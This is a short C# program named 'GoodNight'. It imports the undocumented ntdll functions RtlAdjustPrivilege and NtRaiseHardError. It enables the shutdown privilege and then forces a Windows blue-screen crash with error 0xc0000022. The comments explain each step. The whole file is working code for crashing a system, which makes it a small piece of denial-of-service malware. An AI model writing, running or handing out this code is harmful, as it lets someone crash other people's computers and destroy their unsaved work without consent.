//Importing the necessary libraries
using System;
using System.Runtime.InteropServices;
using System.Threading;

namespace GoodNight
{
    class Program
    {
        //Getting the necessary functions from the ntdll.dll library (RtlAdjustPrivilege witch enables the SeShutdownPrivilege and NtRaiseHardError witch raises a blue screen)
        [DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        //Main function (marked as unsafe, as it uses pointers and raises a blue screen)
        static unsafe void Main(string[] args)
        {
            Boolean t1;
            uint t2;
            //The function RtlAdjustPrivilege is called, which enables the SeShutdownPrivilege
            RtlAdjustPrivilege(19, true, false, out t1);
            //The function NtRaiseHardError is called, which displays a blue screen with the error code 0xc0000022
            //The first parameter is the error code
            //The fifth parameter sets will the system restart or not after the error is displayed and dump is created
            NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
        }
    }
}